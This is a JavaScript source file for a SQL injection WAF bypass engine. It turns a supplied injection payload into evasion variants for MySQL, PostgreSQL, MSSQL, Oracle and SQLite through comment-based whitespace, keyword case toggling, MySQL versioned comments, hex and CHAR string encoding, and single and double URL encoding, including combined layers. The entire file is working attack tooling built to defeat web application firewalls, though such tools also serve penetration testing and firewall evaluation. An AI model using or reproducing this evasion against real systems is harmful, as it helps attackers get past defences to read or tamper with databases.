/**
 * SQL Injection WAF Bypass Engine
 * Generates multiple evasion variants for SQLi payloads.
 * Supports: MySQL, PostgreSQL, MSSQL, Oracle, SQLite
 */

import { urlEncode, doubleUrlEncode, toSqlHex, alternatingCase } from '../utils/encoding.js'
import { splitSqlKeywords, extractQuotedStrings, replaceSqlStringLiterals, mapSqlSegments } from '../utils/helpers.js'
import { finalizeVariants } from '../utils/variants.js'

/* ── Whitespace replacements ──────────────────────── */
const WHITESPACE_ALTERNATIVES = ['/**/', '%09', '%0A', '%0D', '%0C']

const transportWhitespaceNote = 'Requires one application/x-www-form-urlencoded or percent-decoding pass before SQL parsing.'

function escapeTransportLiterals(value) {
  return value.replace(/%/g, '%25').replace(/\+/g, '%2B')
}

function encodeTransportWhitespace(payload, replacement) {
  const escaped = escapeTransportLiterals(payload)
  return mapSqlSegments(
    escaped,
    (code) => code.replace(/ /g, replacement),
    (protectedValue) => protectedValue.replace(/ /g, '%20'),
  )
}

function applyWhitespace(payload) {
  const variants = [{
    payload: mapSqlSegments(payload, (code) => code.replace(/ /g, '/**/')),
    validity: 'validated',
  }]

  variants.push(
    { payload: encodeTransportWhitespace(payload, '%09'), validity: 'conditional', note: transportWhitespaceNote },
    { payload: encodeTransportWhitespace(payload, '%0A'), validity: 'conditional', note: transportWhitespaceNote },
  )

  let whitespaceIndex = 0
  const escapedPluses = escapeTransportLiterals(payload)
  variants.push({
    payload: mapSqlSegments(
      escapedPluses,
      (code) => code.replace(/ /g, () => WHITESPACE_ALTERNATIVES[whitespaceIndex++ % WHITESPACE_ALTERNATIVES.length]),
      (protectedValue) => protectedValue.replace(/ /g, '%20'),
    ),
    validity: 'conditional',
    note: transportWhitespaceNote,
  })

  variants.push({
    payload: mapSqlSegments(
      escapedPluses,
      (code) => code.replace(/ /g, '+'),
      (protectedValue) => protectedValue.replace(/ /g, '%20'),
    ),
    validity: 'conditional',
    note: 'Requires application/x-www-form-urlencoded decoding; literal plus operators are preserved as %2B.',
  })
  return variants
}

/* ── Case toggling ────────────────────────────────── */
function applyCaseToggle(payload) {
  const tokens = splitSqlKeywords(payload)
  return [
    tokens.map((token) => token.type === 'keyword' ? alternatingCase(token.value, 0) : token.value).join(''),
    tokens.map((token) => token.type === 'keyword' ? alternatingCase(token.value, 1) : token.value).join(''),
    tokens.map((token) => token.type === 'keyword' ? token.value.toLowerCase() : token.value).join(''),
  ]
}

/* ── Inline MySQL comments ────────────────────────── */
function applyInlineComments(payload, target) {
  if (target !== 'mysql') {
    // Standard block comments are valid whitespace between tokens. Wrapping a
    // keyword in a comment would delete it and produce invalid SQL.
    const separated = mapSqlSegments(payload, (code) => code.replace(/\s+/g, '/**/'))
    return separated === payload ? [] : [separated]
  }

  const variants = []
  // /*!50000KEYWORD*/
  const tokens = splitSqlKeywords(payload)
  let keywordIndex = 0
  const mysqlVersions = ['50000', '50001', '50500']
  const v1 = tokens.map(t => {
    if (t.type === 'keyword') return `/*!${mysqlVersions[keywordIndex++ % mysqlVersions.length]}${t.value}*/`
    return t.value
  }).join('')
  variants.push(v1)

  // Mix: some keywords wrapped, some not
  keywordIndex = 0
  const v2 = tokens.map(t => {
    if (t.type === 'keyword' && keywordIndex++ % 2 === 0) return `/*!50000${t.value}*/`
    return t.value
  }).join('')
  variants.push(v2)

  // Nested comment style
  const v3 = tokens.map(t => {
    if (t.type === 'keyword') return `/*!${t.value}*/`
    return t.value
  }).join('')
  variants.push(v3)

  return variants
}

/* ── Hex encoding of strings ─────────────────────── */
function sqlHexExpression(content, target) {
  if (content.length === 0) return "''"
  const hex = toSqlHex(content).slice(2)
  if (target === 'postgres') return `convert_from(decode('${hex}','hex'),'UTF8')`
  if (target === 'oracle') return `UTL_I18N.RAW_TO_CHAR(HEXTORAW('${hex}'),'AL32UTF8')`
  if (target === 'sqlite') return `CAST(X'${hex}' AS TEXT)`
  if (target === 'mssql') {
    const utf16Hex = Array.from({ length: content.length }, (_, index) => {
      const unit = content.charCodeAt(index)
      return (unit & 0xff).toString(16).padStart(2, '0')
        + ((unit >> 8) & 0xff).toString(16).padStart(2, '0')
    }).join('')
    return `CONVERT(nvarchar(max), 0x${utf16Hex})`
  }
  return `CONVERT(0x${hex} USING utf8mb4)`
}

function sqlCharExpression(content, target) {
  const points = Array.from(content).map((char) => char.codePointAt(0))
  if (points.length === 0) return "''"
  if (target === 'postgres') return points.map((point) => `chr(${point})`).join('||')
  if (target === 'oracle') {
    const escaped = Array.from({ length: content.length }, (_, index) =>
      `\\${content.charCodeAt(index).toString(16).padStart(4, '0')}`).join('')
    return `UNISTR('${escaped}')`
  }
  if (target === 'mssql') {
    return Array.from({ length: content.length }, (_, index) => `NCHAR(${content.charCodeAt(index)})`).join('+')
  }
  if (target === 'sqlite') return `char(${points.join(',')})`
  const utf8Codes = toSqlHex(content).slice(2).match(/../g)?.map((byte) => Number.parseInt(byte, 16)) ?? []
  return `CHAR(${utf8Codes.join(',')} USING utf8mb4)`
}

function applyHexEncoding(payload, target) {
  const options = { backslashEscapes: target === 'mysql' }
  if (extractQuotedStrings(payload, options).length === 0) return []
  return [
    replaceSqlStringLiterals(payload, (content) => sqlHexExpression(content, target), options),
    replaceSqlStringLiterals(payload, (content) => sqlCharExpression(content, target), options),
  ]
}

/* ── URL encoding of keywords ────────────────────── */
function applyUrlEncoding(payload) {
  const variants = []
  // Full URL encode
  variants.push(urlEncode(payload))
  // Only encode keywords
  const tokens = splitSqlKeywords(payload)
  const v2 = tokens.map(t => t.type === 'keyword' ? urlEncode(t.value) : t.value).join('')
  variants.push(v2)
  return variants
}

/* ── Double URL encoding ─────────────────────────── */
function applyDoubleUrl(payload) {
  const variants = []
  variants.push(doubleUrlEncode(payload))
  // Partial double encode - only keywords
  const tokens = splitSqlKeywords(payload)
  const v2 = tokens.map(t => t.type === 'keyword' ? doubleUrlEncode(t.value) : t.value).join('')
  variants.push(v2)
  return variants
}

/* ── Main Engine ─────────────────────────────────── */
export function generateSqliVariants(payload, layers, target) {
  if (!payload || !payload.trim()) return []

  const allVariants = []

  // Always include original
  allVariants.push({ payload, label: 'Original', layers: [] })

  if (layers.includes('whitespace')) {
    applyWhitespace(payload).forEach(v => {
      allVariants.push({ ...v, label: 'Whitespace Bypass', layers: ['whitespace'] })
    })
  }

  if (layers.includes('case-toggle')) {
    applyCaseToggle(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Case Toggle', layers: ['case-toggle'], validity: 'validated' })
    })
  }

  if (layers.includes('inline-comments')) {
    applyInlineComments(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Inline Comments', layers: ['inline-comments'], validity: target === 'mysql' ? 'conditional' : 'validated' })
    })
  }

  if (layers.includes('hex-encoding')) {
    applyHexEncoding(payload, target).forEach(v => {
      allVariants.push({ payload: v, label: 'Hex Encoding', layers: ['hex-encoding'], validity: 'validated' })
    })
  }

  if (layers.includes('url-encoding')) {
    applyUrlEncoding(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'URL Encoding', layers: ['url-encoding'], validity: 'conditional', note: 'Requires exactly one percent-decoding pass before SQL parsing.' })
    })
  }

  if (layers.includes('double-url')) {
    applyDoubleUrl(payload).forEach(v => {
      allVariants.push({ payload: v, label: 'Double URL', layers: ['double-url'], validity: 'conditional', note: 'Requires exactly two percent-decoding passes before SQL parsing.' })
    })
  }

  // Generate combo variants (mix multiple layers)
  if (layers.length >= 2) {
    // Whitespace + Case toggle
    if (layers.includes('whitespace') && layers.includes('case-toggle')) {
      const ws = mapSqlSegments(payload, (code) => code.replace(/ /g, '/**/'))
      const tokens = splitSqlKeywords(ws)
      const combo = tokens.map(t => t.type === 'keyword' ? alternatingCase(t.value) : t.value).join('')
      allVariants.push({ payload: combo, label: 'Whitespace + Case', layers: ['whitespace', 'case-toggle'] })
    }

    // Inline comments + Case toggle
    if (layers.includes('inline-comments') && layers.includes('case-toggle') && target === 'mysql') {
      const tokens = splitSqlKeywords(payload)
      const combo = tokens.map(t => {
        if (t.type === 'keyword') return `/*!50000${alternatingCase(t.value)}*/`
        return t.value
      }).join('')
      allVariants.push({ payload: combo, label: 'Comments + Case', layers: ['inline-comments', 'case-toggle'] })
    }

    // Whitespace + Hex
    if (layers.includes('whitespace') && layers.includes('hex-encoding')) {
      const spaced = mapSqlSegments(payload, (code) => code.replace(/ /g, '/**/'))
      const combo = replaceSqlStringLiterals(spaced, (content) => sqlHexExpression(content, target), { backslashEscapes: target === 'mysql' })
      if (combo !== spaced) {
        allVariants.push({ payload: combo, label: 'Whitespace + Hex', layers: ['whitespace', 'hex-encoding'] })
      }
    }

    // Case + URL encoding
    if (layers.includes('case-toggle') && layers.includes('url-encoding')) {
      const tokens = splitSqlKeywords(payload)
      const cased = tokens.map(t => t.type === 'keyword' ? alternatingCase(t.value) : t.value).join('')
      const urlTokens = splitSqlKeywords(cased)
      const combo = urlTokens.map(t => t.type === 'keyword' ? urlEncode(t.value) : t.value).join('')
      allVariants.push({ payload: combo, label: 'Case + URL', layers: ['case-toggle', 'url-encoding'] })
    }
  }

  return finalizeVariants(allVariants, layers)
}
